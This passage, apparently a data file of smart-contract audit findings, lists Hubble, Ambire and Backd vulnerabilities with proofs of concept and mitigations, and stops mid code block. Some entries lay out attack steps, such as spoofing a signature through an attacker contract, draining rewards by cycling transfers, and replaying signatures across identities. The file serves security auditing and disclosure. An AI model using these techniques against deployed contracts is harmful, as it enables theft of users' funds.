89.md,All AMMs have to be past nextFundingTime to update,medium,"<https://github.com/code-423n4/2022-02-hubble/blob/ed1d885d5dbc2eae24e43c3ecbf291a0f5a52765/contracts/AMM.sol#L348><br>

settleFunding calls will revert until all AMMs are ready to be updated.

### Proof of Concept

AMM 1 has a nextFundingTime of now. AMM 2 has a nextFundingTime in 30 minutes. AMM 1 won't be able to be updated until after AMM 2's nextFundingTime elapses.

### Recommended Mitigation Steps

You shouldn't revert at the place mentioned in the links to affected code. Just return so that the other AMMs can still get updated.





***"
89.md,Ownership of `Swap.vy` cannot be transferred,medium,"Ownership transfer function of Swap.vy is commented out. Fund can be stuck if an AMM and governance change/upgrade is required.

### Proof of Concept

<https://github.com/code-423n4/2022-02-hubble/blob/ed1d885d5dbc2eae24e43c3ecbf291a0f5a52765/contracts/curve-v2/Swap.vy#L1129>





***"
89.md,Blocking of the VUSD withdrawals is possible if the reserve token doesn't support zero value transfers,medium,"VUSD withdraw queue will be blocked and user funds frozen simply by requesting a zero value withdraw, if the reserve token doesn't support zero value transfers.

Putting it medium only on an assumption that reserve will be USDC and the probability is low, but VUSD do allow any reserve token and the impact here is both funds freeze and stopping of the operations

### Proof of Concept

It is possible to burn zero amount in OZ implementation:

<https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/token/ERC20/ERC20Upgradeable.sol#L285-L300>

So, withdraw will burn zero amount and put it to the queue:

<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/VUSD.sol#L48>

USDC does support zero value transfers, but not all the tokens do:

<https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers>

Currently VUSD can use any reserve token:

<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/VUSD.sol#L33>

Withdraw queue position can be modified in the `processWithdrawals` function only.

But it will fail every time on the zero amount entry, as there is no way to skip it (and mint VUSD back, for example), so anything else after this zero entry will not be processed:

<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/VUSD.sol#L62>

This way the withdrawal functionality and the corresponding user funds will be frozen within VUSD contract, which will become inoperable

### Recommended Mitigation Steps

Consider adding a zero amount check, as it doesn’t cost much, while zero transfer doesn't make sense anyway.

Now:

    reserveToken.safeTransfer(withdrawal.usr, withdrawal.amount);
    reserve -= withdrawal.amount;

To be:

    if (withdrawal.amount > 0) {
    	reserveToken.safeTransfer(withdrawal.usr, withdrawal.amount);
    	reserve -= withdrawal.amount;
    }





***"
89.md,Users are able to front-run bad debt settlements to avoid insurance costs,medium,"<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/InsuranceFund.sol#L71-L75><br>
<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/InsuranceFund.sol#L62-L69>

A user is able to front-run the call to `seizeBadDebt()` in `InsuranceFund.sol` to avoid paying the insurance costs.

`seizeBadDebt()` is called by `MarginAccount.settleBadDebt()` which is a public function. When this functions is called the transaction will appear in the mem pool.  A user may then call `InsuranceFund.withdraw()` to withdraw all of their shares. If they do this with a higher gas fee it will likely be processed before the `settleBadDebt()` transaction. In this way they will avoid incurring any cost from the assets being seized.

The impact is that users may gain their share of the insurance funding payments with minimal risk (minimal as there is a change the front-run will not succeed) of having to repay these costs.

### Proof of Concept

        function withdraw(uint _shares) external {
            settlePendingObligation();
            require(pendingObligation == 0, ""IF.withdraw.pending_obligations"");
            uint amount = balance() * _shares / totalSupply();
            _burn(msg.sender, _shares);
            vusd.safeTransfer(msg.sender, amount);
            emit FundsWithdrawn(msg.sender, amount, block.timestamp);
        }

<!---->

        function seizeBadDebt(uint amount) external onlyMarginAccount {
            pendingObligation += amount;
            emit BadDebtAccumulated(amount, block.timestamp);
            settlePendingObligation();
        }

### Recommended Mitigation Steps

Consider making the withdrawals a two step process. The first step requests a withdrawal and marks the time. The second request processes the withdrawal but requires a period of time to elapse since the first step.

To avoid having users constantly having pending withdrawal, each withdrawal should have an expiry time and also a recharge time. The if the second step is not called within expiry amount of time it should be considered invalid. The first step must not be able to be called until recharge time has passed.

Another solution involves a design change where the insurance fund is slowly filled up over time without external deposits. However, this has the disadvantage that bad debts received early in the protocols life time may not have sufficient insurance capital to cover them.





***"
89.md,AMM Cannot Be `initialize()` Except By Governance,medium,"<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/AMM.sol#L93-L108><br>
<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/AMM.sol#L730-L734><br>
<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/legos/Governable.sol#L10-L13><br>

The contact `AMM.sol` cannot be initialize unless it is called from the `_governance` address.

This prevents the use of a deployer account and requires the governance to be able to deploy proxy contracts and encode the required arguements. If this is not feasible then the contract cannot be deployed.

### Proof of Concept

`initialize()` calls `_setGovernace(_governance);` which will store the governance address.

Following this it will call `syncDeps(_registry);` which has `onlyGovernance` modifier.  Thus, if the `msg.sender` of `initialize()` is not the same as the parameter `_governance` then the initialisation will revert.

```solidity
    function initialize(
        address _registry,
        address _underlyingAsset,
        string memory _name,
        address _vamm,
        address _governance
    ) external initializer {
        _setGovernace(_governance);

        vamm = IVAMM(_vamm);
        underlyingAsset = _underlyingAsset;
        name = _name;
        fundingBufferPeriod = 15 minutes;

        syncDeps(_registry);
    }
```

### Recommended Mitigation Steps

Consider adding the steps manually to `initialize()`. i.e.

```solidity
    function initialize(
        address _registry,
        address _underlyingAsset,
        string memory _name,
        address _vamm,
        address _governance
    ) external initializer {
        _setGovernace(_governance);

        vamm = IVAMM(_vamm);
        underlyingAsset = _underlyingAsset;
        name = _name;
        fundingBufferPeriod = 15 minutes;

        IRegistry registry = IRegistry(_registry);
        clearingHouse = registry.clearingHouse();
        oracle = IOracle(registry.oracle());
}
```





***"
89.md,Assets sent from `MarginAccount` to `InsuranceFund` will be locked forever,medium,"<https://github.com/code-423n4/2022-02-hubble/blob/ed1d885d5dbc2eae24e43c3ecbf291a0f5a52765/contracts/MarginAccount.sol#L377><br>

Assets sent from MarginAccount to InsuranceFund will be locked forever.

### Proof of Concept

The insurance fund doesn't have a way to transfer non-vusd out of the contract.

Assets transferred to the InsuranceFund will be locked forever.

### Recommended Mitigation Steps

Have a way for governance to sweep tokens to swap them.






***"
89.md,Liquidation is vulnerable to sandwich attacks,medium,"When an account is liquidated, there is no minimum amount of the swap, which makes it vulnerable for sandwich attacks.

### Proof of Concept

Alice's long position can be liquidated, bob notices it and creates a short position,<br>
then liquidates her position, thus swapping the base asset to the quote asset,<br>
therefore reducing the base asset price,<br>
then he redeems his short position and profits because the price went down.

### Recommended Mitigation Steps

Set quoteAssetLimit in `_reducePosition` to prevent the attack.





***"
89.md,[WP-H7] `InsuranceFund#syncDeps()` may cause users' fund loss,medium,"<https://github.com/code-423n4/2022-02-hubble/blob/ed1d885d5dbc2eae24e43c3ecbf291a0f5a52765/contracts/InsuranceFund.sol#L116-L119>

```solidity
function syncDeps(IRegistry _registry) public onlyGovernance {
    vusd = IERC20(_registry.vusd());
    marginAccount = _registry.marginAccount();
}
```

The `Governance` address can call `InsuranceFund.sol#syncDeps()` to change the contract address of `vusd` anytime.

However, since the tx to set a new address for `vusd` can get in between users' txs to deposit and withdraw, in some edge cases, it can result in users' loss of funds.

### Proof of Concept

1.  Alice deposited `1,000,000 VUSD` to `InsuranceFund`;
2.  Gov called `syncDeps()` and set `vusd` to the address of `VUSDv2`;
3.  Alice called `withdraw()` with all the `shares` and get back `0 VUSDv2`.

As a result, Alice suffered a fund loss of `1,000,000 VUSD`.

##### Recommended Mitigation Steps

1.  Consider making `vusd` unchangeable;
2.  If a possible migration of `vusd` must be considered, consider changing the `syncDeps()` to:

```solidity
function syncDeps(IRegistry _registry) public onlyGovernance {
    uint _balance = balance();
    vusd = IERC20(_registry.vusd());
    require(balance() >= _balance);
    marginAccount = _registry.marginAccount();
}
```





***"
89.md,USDC blacklisted accounts can DoS the withdrawal system,medium,"DoS of USDC withdrawal system

### Proof of Concept

Currently, withdrawals are queued in an array and processed sequentially in a for loop.<br>
However, a `safeTransfer()` to USDC blacklisted user will fail. It will also brick the withdrawal system because the blacklisted user is never cleared.

<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/VUSD.sol#L53-L67>

### Recommended Mitigation Steps

Possible solutions:<br>
1st solution:<br>
Implement 2-step withdrawals:<br>
\- In a for loop, increase the user's amount that can be safely withdrawn.<br>
\- A user himself withdraws his balance<br>

2nd solution:<br>
Skip blacklisted users in a processWithdrawals loop






***"
89.md,Usage of an incorrect version of Ownable library can potentially malfunction all `onlyOwner` functions,medium,"The current implementaion is using a non-upgradeable version of the Ownable library. Instead of the upgradeable version: @openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol.

A regular, non-upgradeable Ownable library will make the deployer the default owner in the constructor. Due to a requirement of the proxy-based upgradeability system, no constructors can be used in upgradeable contracts. Therefore, there will be no owner when the contract is deployed as a proxy contract

### Recommended Mitigation Steps

Use @openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol and @openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol instead.

And add __Ownable_init(); at the beginning of the initializer.
    
Oracle.sol<br>
AMM.sol



***"
38.md,Prevent execution with invalid signatures,high,"#### Impact
Suppose one of the supplied `addrs\[i]` to the constructor of `Identity.sol` happens to be 0 ( by accident).

In that case: `privileges\[0] = 1`

Now suppose you call `execute()` with an invalid signature, then `recoverAddrImpl` will return a value of 0 and thus signer=0.
If you then check ""`privileges\[signer] !=0`""  this will be true and anyone can perform any transaction.

This is clearly an unwanted situation.

#### Proof of Concept
  - [`Identity.sol#L23` L30](https://github.com/code-423n4/2021-10-ambire/blob/bc01af4df3f70d1629c4e22a72c19e6a814db70d/contracts/Identity.sol#L23-L30)
  - [`Identity.sol#L97` L98](https://github.com/code-423n4/2021-10-ambire/blob/bc01af4df3f70d1629c4e22a72c19e6a814db70d/contracts/Identity.sol#L97-L98)

#### Recommended Mitigation Steps
In the constructor of `Identity.sol`, add in the for loop the following:

```solidity
require (addrs\[i] !=0,""Zero not allowed"");
```"
38.md,`QuickAccManager.sol#cancel()` Wrong `hashTx` makes it impossible to cancel a scheduled transaction,high,"In `QuickAccManager.sol#cancel()`, the `hashTx` to identify the transaction to be canceled is wrong. The last parameter is missing.

As a result, users will be unable to cancel a scheduled transaction.

 [`QuickAccManager.sol#L91` L91](https://github.com/code-423n4/2021-10-ambire/blob/bc01af4df3f70d1629c4e22a72c19e6a814db70d/contracts/wallet/QuickAccManager.sol#L91-L91)
```solidity
function cancel(Identity identity, QuickAccount calldata acc, uint nonce, bytes calldata sig, Identity.Transaction[] calldata txns) external {
  bytes32 accHash = keccak256(abi.encode(acc));
  require(identity.privileges(address(this)) == accHash, 'WRONG_ACC_OR_NO_PRIV');

  bytes32 hash = keccak256(abi.encode(CANCEL_PREFIX, address(this), block.chainid, accHash, nonce, txns, false));
  address signer = SignatureValidator.recoverAddr(hash, sig);
  require(signer == acc.one || signer == acc.two, 'INVALID_SIGNATURE');

  // @NOTE: should we allow cancelling even when it's matured? probably not, otherwise there's a minor grief
  // opportunity: someone wants to cancel post-maturity, and you front them with execScheduled
  bytes32 hashTx = keccak256(abi.encode(address(this), block.chainid, accHash, nonce, txns));
  require(scheduled[hashTx] != 0 && block.timestamp < scheduled[hashTx], 'TOO_LATE');
  delete scheduled[hashTx];

  emit LogCancelled(hashTx, accHash, signer, block.timestamp);
}
```

##### Recommendation
Change to:

```solidity
bytes32 hashTx = keccak256(abi.encode(address(this), block.chainid, accHash, nonce, txns, false));
```"
38.md,Signature replay attacks for different identities (nonce on wrong party),high,"A single `QuickAccount` can serve as the ""privilege"" for multiple identities, see the comment in `QuickAccManager.sol`:

> NOTE: a single accHash can control multiple identities, as long as those identities set it's hash in privileges\[address(this)]. this is by design

If there exist two different identities that *both share the same QuickAccount* (`identity1.privileges(address(this)) == identity2.privileges(address(this)) == accHash`) the following attack is possible in `QuickAccManager.send`:

Upon observing a valid `send` on the first identity, the same transactions can be replayed on the second identity by an attacker calling `send` with the same arguments and just changing the `identity` to the second identity.

This is because the `identity` is not part of the `hash`. Including the **nonce of** the identity in the hash is not enough.

Two fresh identities will both take on nonces on zero and lead to the same hash.

#### Impact
Transactions on one identity can be replayed on another one if it uses the same `QuickAccount`.
For example, a transaction paying a contractor can be replayed by the contract on the second identity earning the payment twice.

#### Recommended Mitigation Steps

1.  Nonces should not be indexed by the identity but by the `accHash`. This is because nonces are used to stop replay attacks and thus need to be on the *signer* (`QuickAccount` in this case), not on the target contract to call.
2.  The `identity` *address* itself needs to be part of `hash` as otherwise the `send` can be frontrun and executed by anyone on the other identity by switching out the `identity` parameter.

#### Other occurrences
This issue of using the wrong nonce (on the `identity` which means the nonces repeat per identity) and not including `identity` address leads to other attacks throughout the `QuickAccManager`:

*   `cancel`: attacker can use the same signature to cancel the same transactions on the second identity
*   `execScheduled`: can frontrun this call and execute it on the second identity instead. This will make the original transaction fail as `scheduled[hash]` is deleted.
*   `sendTransfer`: same transfers can be replayed on second identity
*   `sendTxns`: same transactions can be replayed on second identity"
38.md,`QuickAccManager` Smart Contract signature verification can be exploited,high,"Several different signature modes can be used and `Identity.execute` forwards the `signature` parameter to the `SignatureValidator` library.
The returned `signer` is then used for the `privileges` check:

```solidity
address signer = SignatureValidator.recoverAddrImpl(hash, signature, true);
// signer will be QuickAccountContract
require(privileges[signer] != bytes32(0), 'INSUFFICIENT_PRIVILEGE');
```

It's possible to create a smart contract mode signature (`SignatureMode.SmartWallet`) for arbitrary transactions as the `QuickAccManager.isValidSignature` uses an attacker-controlled `id` identity contract for the privileges check.
An attacker can just create an attacker contract returning the desired values and the smart-wallet signature appears to be valid:

```solidity
// @audit id is attacker-controlled
(address payable id, uint timelock, bytes memory sig1, bytes memory sig2) = abi.decode(signature, (address, uint, bytes, bytes));
// @audit this may not be used for authorization, attacker can return desired value
if (Identity(id).privileges(address(this)) == accHash) {
  // bytes4(keccak256(""isValidSignature(bytes32,bytes)"")
  return 0x1626ba7e;
} else {
  return 0xffffffff;
}
```

#### POC
Assume an `Identity` contract is set up with a `QuickAccManager` as the `privileges` account, i.e. `privileges[accHash] != 0`.

We can construct a `SignatureMode.SmartWallet` signature for an *arbitrary* hash:

1.  Call `Identity.execute(txns, spoofedSignature)` where `spoofedSignature = abi.encode(attackerContract, timelock=0, sig1=0, sig2=0, address(quickAccountManager), SignatureMode.SmartWallet)`
2.  This will call `recoverAddrImpl(txnsHash, spoofedSignature, true)`, decode the bytes **at the end** of `spoofedSignature` and determine `mode = SignatureMode.SmartWallet` and `wallet = quickAccountManager`. It will cut off these arguments and call `quickAccountManager.isValidSignature(txnsHash, (attackerContract, 0, 0, 0))`
3.  The `QuickAccManager` will decode the signature, construct `accHash` which is the hash of all zeroes (due to failed signatures returning 0). It will then call `attacker.privileges(address(this))` and the attacker contract can return the `accHash` that matches an account hash of failed signatures, i.e., `keccak256(abi.encode(QuickAccount(0,0,0)))`. The comparison is satisfied and it returns the success value.
4.  The checks in `Identity.execute` pass and the transactions `txns` are executed.

#### Impact
Any `Identity` contract using `QuickAccManager` can be exploited.
Funds can then be stolen from the wallet.

#### Recommendation
The issue is that `QuickAccManager` blindly trusts the values in `signature`.
It might be enough to remove the `id` from the `signature` and use `msg.sender` as the identity instead: `Identity(msg.sender).privileges(address(this)) == accHash`.
This seems to work with the current `Identity` implementation but might not work if this is extended and the `isValidSignature` is called from another contract and wants to verify a signature on a different identity.
In that case, the `Identity/SignatureValidator` may not blindly forward the attacker-supplied signature and instead needs to re-encode the parameters with trusted values before calling `QuickAccManager`."
112.md,User can steal all rewards due to checkpoint after transfer,high,"[StakerVault.sol#L112-L119](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L112-L119)<br>

I believe this to be a high severity vulnerability that is potentially included in the currently deployed `StakerVault.sol` contract also. The team will be contacted immediately following the submission of this report.

In `StakerVault.sol`, the user checkpoints occur AFTER the balances are updated in the `transfer()` function. The user checkpoints update the amount of rewards claimable by the user. Since their rewards will be updated after transfer, a user can send funds between their own accounts and repeatedly claim maximum rewards since the pool's inception.

In every actionable function except `transfer()` of `StakerVault.sol`, a call to `ILpGauge(lpGauge).userCheckpoint()` is correctly made BEFORE the action effects.

### Proof of Concept

Assume a certain period of time has passed since the pool's inception. For easy accounting, assume `poolStakedIntegral` of `LpGauge.sol` equals `1`. The `poolStakedIntegral` is used to keep track of the current reward rate.

Steps:

*   Account A stakes 1000 LP tokens. `balances[A] += 1000`
*   In the same `stakeFor()` function, `userCheckpoint()` was already called so A will already have `perUserShare[A]` set correctly based on their previously 0 balance and the current `poolStakedIntegral`.
*   Account A can immediately send all balance to Account B via `transfer()`.
*   Since the checkpoint occurs after the transfer, B's balance will increase and then `perUserShare[B]` will be updated. The calculation for `perUserShare` looks as follows.

<!---->
```solidity
perUserShare[user] += (
            (stakerVault.stakedAndActionLockedBalanceOf(user)).scaledMul(
                (poolStakedIntegral_ - perUserStakedIntegral[user])
            )
        );
```

Assuming Account B is new to the protocol, their `perUserStakedIntegral[user]` will default to `0`.

`perUserShare[B] += 1000 * (1 - 0) = 1000`

*   B is able to call `claimRewards()` and mint all 1000 reward tokens.
*   B then calls `transfer()` and sends all 1000 staked tokens to Account C.
*   Same calculation occurs, and C can claim all 1000 reward tokens.
*   This process can be repeated until the contract is drained of reward tokens.

### Recommended Mitigation Steps

In `StakerVault.transfer()`, move the call to `ILpGauge(lpGauge).userCheckpoint()` to before the balances are updated.





***"
112.md,function `lockFunds` in `TopUpActionLibrary` can cause serious fund lose. fee and Capped bypass. It's not calling `stakerVault.increaseActionLockedBalance` when transfers stakes.,high,"[TopUpAction.sol#L57-L65](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L57-L65)<br>

In function TopUpActionLibrary.lockFunds when transfers stakes from payer it doesn't call stakerVault.increaseActionLockedBalance for that payer so stakerVault.actionLockedBalances\[payer] is not get updated for payer and stakerVault.stakedAndActionLockedBalanceOf(payer) is going to show wrong value and any calculation based on this function is gonna be wrong which will cause fund lose and theft and some restriction bypasses.

### Proof of Concept

When user wants to create a TopUpAction. so he deposit his funds to Pool and get LP token. then stake the LP token in StakerVault and use that stakes to create a TopUp position with function TopUpAction.register. This function transfer user stakes (locks user staks) and create his position.<br>

For transferring and locking user stakes it uses TopUpActionLibrary.lockFunds. function lockFunds transfers user stakes but don't call stakerVault.increaseActionLockedBalance for the payer which cause that stakerVault.actionLockedBalances\[payer] to get different values(not equal to position.depositTokenBalance).<br>

Function StakerVault.stakedAndActionLockedBalanceOf(account) uses stakerVault.actionLockedBalances\[account] so it will return wrong value and any where in code that uses stakedAndActionLockedBalanceOf() is going to cause problems.<br>

three part of the codes uses stakerVault.stakedAndActionLockedBalanceOf():<br>
1. LiqudityPool.depositFor() for checking user total deposits to be less than depositCap.<br>
2. LiqudityPool.\_updateUserFeesOnDeposit() for updating user fee on new deposits.<br>
3. userCheckpoint() for calculating user rewards.<br>
attacker can use #1 and #2 to bypass high fee payment and max depositCap and #3 will cause users to lose
rewards.<br>

The detail steps:<br>
1- user deposit fund to Pool and get LP token.<br>
2- user stakes LP token in StakerVault.<br>
3- user approve TopUpAction address to transfer his staks in StakerVault.<br>
3- user use all his stakes to create a position with TopUpAction.register() function.<br>
3.1- register() will call lockFunds to transfer and lock user stakes.<br>
3.2- lockFunds() will transfer user stakes with stakerVault.transferFrom() but don't call stakerVault.increaseActionLockedBalance() so StakerVault.actionLockedBalances\[user] will be zero.<br>
3.3- StakerVault.balance\[useer] will be zero too because his stakes get transfers in 3.2<br>
4- StakerVault.stakedAndActionLockedBalanceOf(user) will return zero (user has some locked stakes in TopUpAction but because of the bug calculation get out of sync)<br>

In this moment user will lose all the rewards that are minted in LpGauge. because userCheckpoint() use stakerVault.stakedAndActionLockedBalanceOf(user) for calculating rewards which is zero  and new rewards will be zero too.<br>

Attacker can use this process to bypass ""max deposit Cap"" and deposit any amount of assets he wants. because LiqudityPool.depositFor(address,uint256,uint256) uses stakedAndActionLockedBalanceOf to check user deposits which is zero so Attacker can deposit & stake & register to make his balance zero and repeat this and in the end reset his TopUp positions to get back his large stakes which are multiple time bigger than ""max deposit Cap""

Attacker can also use this process to bypass fee penalties for early withdraw. because LiqudityPool.\_updateUserFeesOnDeposit() to get user current balance use stakedAndActionLockedBalanceOf() which is zero. so the value of shareExisting variable become zero and newFeeRatio will be calculated based on feeOnDeposit which can be minFee if asset is already in wallet for some time.

### Tools Used

VIM

### Recommended Mitigation Steps

Add this line to TopUpActionLibrary.lockFunds() after stakerVault.transferFrom():

stakerVault.increaseActionLockedBalance(payer, amountLeft);





***"
112.md,Customers cannot be `topUp()`ed a second time,high,"[CompoundHandler.sol#L71](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L71)<br>
[CompoundHandler.sol#L120](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L120)<br>
[AaveHandler.sol#L53](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/AaveHandler.sol#L53)<br>
[TopUpAction.sol#L847](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L847)<br>

OpenZeppelin's `safeApprove()` will revert if the account already is approved and the new `safeApprove()` is done with a non-zero value.

```solidity
function safeApprove(
    IERC20 token,
    address spender,
    uint256 value
) internal {
    // safeApprove should only be called when setting an initial allowance,
    // or when resetting it to zero. To increase and decrease it, use
    // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'
    require(
        (value == 0) || (token.allowance(address(this), spender) == 0),
        ""SafeERC20: approve from non-zero to non-zero allowance""
    );
    _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
}
```

[OpenZeppelin/SafeERC20.sol#L45-L58](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/fcf35e5722847f5eadaaee052968a8a54d03622a/contracts/token/ERC20/utils/SafeERC20.sol#L45-L58)<br>

### Impact

Customers cannot be topped up a second time, which will cause them to be liquidated even though they think they're protected.

### Proof of Concept

There are multiple places where `safeApprove()` is called a second time without setting the value to zero first. The instances below are all related to topping up.

Compound-specific top-ups will fail the second time around when approving the `ctoken` again:

```solidity
File: backd/contracts/actions/topup/handlers/CompoundHandler.sol   #1

50       function topUp(
51           bytes32 account,
52           address underlying,
53           uint256 amount,
54           bytes memory extra
55       ) external override returns (bool) {
56           bool repayDebt = abi.decode(extra, (bool));
57           CToken ctoken = cTokenRegistry.fetchCToken(underlying);
58           uint256 initialTokens = ctoken.balanceOf(address(this));
59   
60           address addr = account.addr();
61   
62           if (repayDebt) {
63               amount -= _repayAnyDebt(addr, underlying, amount, ctoken);
64               if (amount == 0) return true;
65           }
66   
67           uint256 err;
68           if (underlying == address(0)) {
69               err = ctoken.mint{value: amount}(amount);
70           } else {
71               IERC20(underlying).safeApprove(address(ctoken), amount);
```

[CompoundHandler.sol#L50-L71](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L50-L71)<br>

Compound-specific top-ups will also fail when trying to repay debt:

```solidity
File: backd/contracts/actions/topup/handlers/CompoundHandler.sol   #2

62           if (repayDebt) {
63               amount -= _repayAnyDebt(addr, underlying, amount, ctoken);
64               if (amount == 0) return true;
65           }
```

[CompoundHandler.sol#L62-L65](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L62-L65)<br>

Aave-specific top-ups will fail for the `lendingPool`:

```solidity
File: backd/contracts/actions/topup/handlers/AaveHandler.sol   #3

36       function topUp(
37           bytes32 account,
38           address underlying,
39           uint256 amount,
40           bytes memory extra
41       ) external override returns (bool) {
42           bool repayDebt = abi.decode(extra, (bool));
43           if (underlying == address(0)) {
44               weth.deposit{value: amount}();
45               underlying = address(weth);
46           }
47   
48           address addr = account.addr();
49   
50           DataTypes.ReserveData memory reserve = lendingPool.getReserveData(underlying);
51           require(reserve.aTokenAddress != address(0), Error.UNDERLYING_NOT_SUPPORTED);
52   
53           IERC20(underlying).safeApprove(address(lendingPool), amount);
```

[AaveHandler.sol#L36-L53](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/AaveHandler.sol#L36-L53)<br>

The `TopUpAction` itself fails for the `feeHandler`:

```solidity
File: backd/contracts/actions/topup/TopUpAction.sol   #4

840       function _payFees(
841           address payer,
842           address beneficiary,
843           uint256 feeAmount,
844           address depositToken
845       ) internal {
846           address feeHandler = getFeeHandler();
847           IERC20(depositToken).safeApprove(feeHandler, feeAmount);
```

[TopUpAction.sol#L840-L847](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L840-L847)<br>

I've filed the other less-severe instances as a separate medium-severity issue, and flagged the remaining low-severity instances in my QA report.

### Recommended Mitigation Steps

Always do `safeApprove(0)` if the allowance is being changed, or use `safeIncreaseAllowance()`.





***"
112.md,`call()` should be used instead of `transfer()` on an `address payable`,medium,"This is a classic Code4rena issue:

*   <https://github.com/code-423n4/2021-04-meebits-findings/issues/2>
*   <https://github.com/code-423n4/2021-10-tally-findings/issues/20>
*   <https://github.com/code-423n4/2022-01-openleverage-findings/issues/75>

### Impact

The use of the deprecated `transfer()` function for an address will inevitably make the transaction fail when:

1.  The claimer smart contract does not implement a payable function.
2.  The claimer smart contract does implement a payable fallback which uses more than 2300 gas unit.
3.  The claimer smart contract implements a payable fallback function that needs less than 2300 gas units but is called through proxy, raising the call's gas usage above 2300.

Additionally, using higher than 2300 gas might be mandatory for some multisig wallets.

#### Impacted lines:

```solidity
backd/contracts/pool/EthPool.sol:
  30:         to.transfer(amount);

backd/contracts/strategies/BkdEthCvx.sol:
   77:             payable(vault).transfer(amount);
   93:         payable(vault).transfer(amount);
  117:         payable(vault).transfer(underlyingBalance);

backd/contracts/vault/EthVault.sol:
  29:         payable(to).transfer(amount); 
  37:         payable(addressProvider.getTreasury()).transfer(amount);  

backd/contracts/vault/VaultReserve.sol:
  81:             payable(msg.sender).transfer(amount);
```

### Recommended Mitigation

I recommend using `call()` instead of `transfer()`.






***"
112.md,Its possible to lose total governance control by mistake,medium,"[RoleManager.sol#L43-L46](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/RoleManager.sol#L43-L46)<br>
[RoleManager.sol#L115-L128](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/RoleManager.sol#L115-L128)<br>

The impact of this vulnerability, i.e.,  losing all governance control is very High.<br>
There is a possibility, due to a corner case as described below.<br>

### Proof of Concept
Contract : RoleManager.sol<br>
Function : renounceGovernance()<br>
```
   Step 0:
     Let current governance role given to = CURRENT_GOV_ADDRESS
     so, getRoleMemberCount() for ""governance"" role will return = 1 

   Step 1: Add a new address say ALICE to governance role, by addGovernor(ALICE)
     now, ALICE also has governace role, and getRoleMemberCount() for ""governance"" role will return = 2 
   
   Step 2: Assume that ALICE renounces governance role, by renounceGovernance()
     now, ALICE does not have governance role, but getRoleMemberCount() for ""governance"" role will return = 2, due to a BUG

   Step 3: In some distant future, if there is a compromise of CURRENT_GOV_ADDRESS keys or due to some other reason, 
     its decided to revoke governance role for CURRENT_GOV_ADDRESS via renounceGovernance(), and the command succeeds
     It can be assumed that since getRoleMemberCount() for ""governance"" role returns = 2, at least there is one other active governor address. 
     But now, CURRENT_GOV_ADDRESS does not have governance role, and the total governance control on the protocol is lost my mistake.
```
### Recommended Mitigation Steps
getRoleMemberCount() currently returns _roleMembers[role].length();<br>
  It should return the count only for _roles[role].members[account] = true;<br>

Its recommended to add a new function to know who are the active members for any role,<br>
  like getRoleMembers(bytes32 role) returning address account.







***"
112.md,"Lack of `safeApprove(0)` prevents some registrations, and the changing of stakers and LP tokens",medium,"[TopUpAction.sol#L50](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L50)<br>
[LiquidityPool.sol#L721](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L721)<br>

OpenZeppelin's `safeApprove()` will revert if the account already is approved and the new `safeApprove()` is done with a non-zero value

```solidity
    function safeApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        // safeApprove should only be called when setting an initial allowance,
        // or when resetting it to zero. To increase and decrease it, use
        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            ""SafeERC20: approve from non-zero to non-zero allowance""
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
```

[OpenZeppelin/SafeERC20.sol#L45-L58](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/fcf35e5722847f5eadaaee052968a8a54d03622a/contracts/token/ERC20/utils/SafeERC20.sol#L45-L58)<br>

### Impact

Customers can be prevented from `register()`ing the same `token`/`stakerVaultAddress` as another customer; and once changed away from, stakers and lptokens can't be used in the future.

### Proof of Concept

There are multiple places where `safeApprove()` is called a second time without setting the value to zero first.

`register()` calls `lockFunds()` for each user registration, and since users will use the same tokens and staker vaults, the second user's `register()` call will fail:

```solidity
